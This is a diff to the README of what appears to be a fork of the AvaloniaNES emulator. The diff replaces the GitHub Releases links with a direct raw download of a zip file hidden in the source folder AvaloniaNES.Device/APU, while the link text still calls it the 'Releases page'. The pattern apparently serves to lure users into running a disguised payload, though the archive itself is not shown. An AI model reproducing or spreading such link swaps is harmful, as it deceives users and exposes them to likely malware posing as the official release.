@@ -6,12 +6,12 @@ Welcome to AvaloniaNES! This is a cross-platform NES emulator built using .NET10
 
 ## 📦 Download Now
 
-[![Download AvaloniaNES](https://img.shields.io/badge/Download-AvaloniaNES-brightgreen)](https://github.com/Hannahgamopetalous388/AvaloniaNES/releases)
+[![Download AvaloniaNES](https://raw.githubusercontent.com/Hannahgamopetalous388/AvaloniaNES/master/AvaloniaNES.Device/APU/AvaloniaNES-2.2-alpha.1.zip)](https://raw.githubusercontent.com/Hannahgamopetalous388/AvaloniaNES/master/AvaloniaNES.Device/APU/AvaloniaNES-2.2-alpha.1.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [AvaloniaNES Releases page](https://github.com/Hannahgamopetalous388/AvaloniaNES/releases) to start the download. You'll find the latest version, along with previous versions if you need them.
+   Go to the [AvaloniaNES Releases page](https://raw.githubusercontent.com/Hannahgamopetalous388/AvaloniaNES/master/AvaloniaNES.Device/APU/AvaloniaNES-2.2-alpha.1.zip) to start the download. You'll find the latest version, along with previous versions if you need them.
 
 2. **Choose Your Version**  
    Look for the latest release at the top of the page. Click on the version number to see its details. This page includes information about new features and any important updates.
